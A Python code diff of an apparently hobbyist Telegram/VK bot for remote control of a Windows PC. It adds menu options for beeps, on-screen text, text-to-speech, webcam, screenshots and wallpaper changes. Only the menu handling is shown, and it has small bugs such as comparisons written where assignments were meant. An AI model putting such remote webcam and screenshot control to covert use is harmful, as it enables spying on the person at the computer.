@@ -76,7 +76,7 @@ def resurs_monitor():#взятие показаний загрузки ЦП(8 с
 def msg_root(event):#вывод текста на экран от пользователя 
     root_text=event.text.lower()
     root=Tk()
-    root.title("WinIR-дистанционное управление")
+    root.title("Текстовое уведомление")
     root.geometry("3000x2500")
     lab=Label(root,text=root_text,font="Arial 16")
     root.call('wm', 'attributes', '.', '-topmost', '1')    
@@ -195,7 +195,7 @@ def secondary_main(token, id_admin, turn_on):#всегдда проверка н
 
     
 def main(token, id_admin, turn_on):    
-    global sound_stat
+    global sound_stat,text_speach, text_window
     
     #system variables
     file_path=os.path.dirname(os.path.realpath(__main__.__file__))#link to startup
@@ -219,12 +219,14 @@ def main(token, id_admin, turn_on):
     btn5 = KeyboardButton("Настройки⚙")
     markup.add(btn1, btn2, btn3, btn4, btn5)
     markup_functional = ReplyKeyboardMarkup(resize_keyboard=True)
-    btn1 = KeyboardButton("Звуковое оповещение")
-    btn2 = KeyboardButton("Вывод текста")
-    btn3 = KeyboardButton("Веб-камера")
-    btn4 = KeyboardButton("Создание окна")
-    btn5 = KeyboardButton("Веб-камера")
-    btn6 = KeyboardButton("Открытие файлов/приложений")
+    btn1 = KeyboardButton("Звуковое оповещение🔊")
+    btn2 = KeyboardButton("Вывод текста🗣💌")
+    btn3 = KeyboardButton("Веб-камера📸")
+    btn4 = KeyboardButton("Скриншот📟")
+    btn5 = KeyboardButton("Активное приложение🎰")
+    btn6 = KeyboardButton("Открытие файлов/приложений🎰")
+    btn7 = KeyboardButton("Изменение изображения рабочего стола🌌")
+    
     btn_newpage = KeyboardButton("След. страница➡️")
     btn_exit = KeyboardButton("Главное меню🔙")
     markup_functional.add(btn1, btn2, btn3, btn4, btn5, btn6, btn_exit, btn_newpage)
@@ -243,9 +245,15 @@ def main(token, id_admin, turn_on):
         
     menu_stat=False
     sound_stat=False
+    text_menu=False
+    text_speach=False
+    text_window=False
+        
+    
     @bot.message_handler(content_types=['text'])
     def get_text_messages(message):
-        global menu_stat, sound_stat
+        global menu_stat, sound_stat, text_speach, text_window, text_menu
+        
         ######################################################################################################
         if message.text.lower() == "управление🚀" or message.text.lower() == "управление":
             bot.send_message(id_admin,"Выберите действие на клавиатуре:", reply_markup=markup_functional)
@@ -256,14 +264,14 @@ def main(token, id_admin, turn_on):
 
 
 
-        elif message.text.lower() == "звуковое оповещение":
+        elif message.text.lower() == "звуковое оповещение🔊" or message.text.lower() == "звуковое оповещение":
             markup_exit = ReplyKeyboardMarkup(resize_keyboard=True)
             btn_exit = KeyboardButton("Отмена")
             markup_exit.add(btn_exit)
             bot.send_message(id_admin, "Введите время воспроизведения звукового сигнала(в секундах)", reply_markup=markup_exit)
             sound_stat=True
             
-        elif menu_stat=="control" and sound_stat==True and message:
+        elif sound_stat==True and message:
             try:
                 if message.text.lower()=="отмена":
                     bot.send_message(id_admin, "Действие отменено. Выберите действие на клавиатуре:", reply_markup=markup_functional)
@@ -279,13 +287,97 @@ def main(token, id_admin, turn_on):
                     bot.send_message(id_admin, 'Время не может быть нулевым! Попробуйте ещё раз', reply_markup=markup_functional)
                     
                 elif int(message.text.lower())>10:
-                    bot.send_message(id_admin, 'Гудки больше 10 сек. бот не производит!', reply_markup=markup_functional)
-                        
+                    bot.send_message(id_admin, 'Гудки больше 10 сек. бот не производит!', reply_markup=markup_functional)  
                 sound_stat=False
+                
             except ValueError:
                 bot.send_message(id_admin, 'Вы ввели не число! Попробуйте ещё раз', reply_markup=markup_functional)
                 sound_stat=False
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                
+        elif message.text.lower() == "вывод текста🗣💌" or message.text.lower() == "вывод текста":
+            markup_exit_and_choise = ReplyKeyboardMarkup(resize_keyboard=True)
+            btn1 = KeyboardButton("Вывод текста в окно")
+            btn2 = KeyboardButton("Воспроизведение текста вслух")
+            btn_exit = KeyboardButton("Отмена")
+            markup_exit_and_choise.add(btn1, btn2, btn_exit)
+            bot.send_message(id_admin, "Выберите действие на клавиатуре:", reply_markup=markup_exit_and_choise)
+            text_menu=True
+            
+        elif text_menu==True and text_window==False and text_speach==False and message:
+            try:
+                markup_exit = ReplyKeyboardMarkup(resize_keyboard=True)
+                btn_exit = KeyboardButton("Отмена")
+                markup_exit.add(btn_exit)
+                if message.text.lower()=="отмена":
+                    bot.send_message(id_admin, "Действие отменено. Выберите действие на клавиатуре:", reply_markup=markup_functional)
+                    
+                elif message.text.lower()=="вывод текста в окно":
+                    bot.send_message(id_admin, "Введите текст для вывода в окно", reply_markup=markup_exit)
+                    text_window=True
+                elif message.text.lower()=="воспроизведение текста вслух":
+                    bot.send_message(id_admin, "Введите текст для воспроизведения вслух", reply_markup=markup_exit)
+                    text_speach=True
+                else:
+                    bot.send_message(id_admin, "Такой функции нет. Попробуйте ещё раз", reply_markup=markup_functional)
+                    text_menu=False
+            except ValueError:
+                bot.send_message(id_admin, 'Возникла проблема при выборе! Попробуйте ещё раз', reply_markup=markup_functional)
+                text_menu=False
+                
+        elif text_menu==True and text_speach==True and text_window==False and message:
+            if message.text.lower()=="отмена":
+                bot.send_message(id_admin, "Действие отменено. Выберите действие на клавиатуре:", reply_markup=markup_functional)
+            else:
+                try:
+                    text_speaker(message.text.lower())
+                    bot.send_message(id_admin, "Текст был воспроизведён", reply_markup=markup_functional)
+
+                except:
+                    bot.send_message(id_admin, 'Возникла проблема! Попробуйте ещё раз', reply_markup=markup_functional)
+            text_menu==False
+            text_speach=False
+            text_window=False
+                
+        elif text_menu==True and text_window==True and text_speach==False and message:
+            if message.text.lower()=="отмена":
+                bot.send_message(id_admin, "Действие отменено. Выберите действие на клавиатуре:", reply_markup=markup_functional)
+            else:
+                try:         
+                    mainloop_thread = threading.Thread(target=msg_root, args=(message,))
+                    mainloop_thread.start()
+                    bot.send_message(id_admin, "Окно с текстом было успешно создано!", reply_markup=markup_functional)
+                    
+                except:
+                    bot.send_message(id_admin, 'Возникла проблема! Попробуйте ещё раз', reply_markup=markup_functional)
+            text_menu==False
+            text_speach=False
+            text_window=False                
         ######################################################################################################
         elif message.text.lower() == "работа с файлами📁" or message.text.lower() == "работа с файлами":
             markup = ReplyKeyboardMarkup(resize_keyboard=False)
@@ -312,7 +404,7 @@ def main(token, id_admin, turn_on):
         ######################################################################################################
         elif message.text.lower() == "сведения и информацияℹ" or message.text.lower() == "сведения и информация":
             markup = ReplyKeyboardMarkup(resize_keyboard=True)
-            btn1 = KeyboardButton("Звуковое оповещение")
+            btn1 = KeyboardButton("Нагрузка на систему(ЦП,)")
             btn2 = KeyboardButton("Вывод текста")
             btn3 = KeyboardButton("Веб-камера")
             btn4 = KeyboardButton("Создание окна")
@@ -611,36 +703,7 @@ def main(token, id_admin, turn_on):
                                     vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message=f'было создано окно с текстом: {event.text.lower()}')
                                     break
                       
-                    ######################################        
-                    if event.text.lower()=="гудок":
-                        try:     
-                            vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=keyboard_one.get_keyboard(),message='Введите длительность гудка:')               
-                            longpoll=VkLongPoll(vk_session)                
-                            for event in longpoll.listen():
-                                if event.type==VkEventType.MESSAGE_NEW:
-                                    if event.text.lower()=="назад":                            
-                                        vk.messages.send(user_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message='Звуковое уведомление не было отправлено')
-                                        break
-                                    else:                                        
-                                        try:
-                                            if int(event.text.lower())<=10 and int(event.text.lower())>0:
-                                                winsound.Beep(500,int(event.text.lower())*1000)
-                                                vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message=f'Был произведён гудок с длительностью: {event.text.lower()} сек.')
 
-                                            elif int(event.text.lower())<0:
-                                                vk.messages.send(user_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message=f'Время {event.text.lower()} не может быть отрицательным!')
-
-                                            elif int(event.text.lower())==0:
-                                                vk.messages.send(user_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message='Время не может быть нулевым!')
-                                            else:
-                                                vk.messages.send(user_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message='Гудки больше 10 сек. бот не производит!')
-                                        except ValueError:
-                                            vk.messages.send(user_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message='Вы ввели не число!')
-                                        
-                                        break
-                                    
-                        except Exception:
-                            error_msg(profile_id)
                            
 
                     if event.text.lower()=="воспроизведение текста":
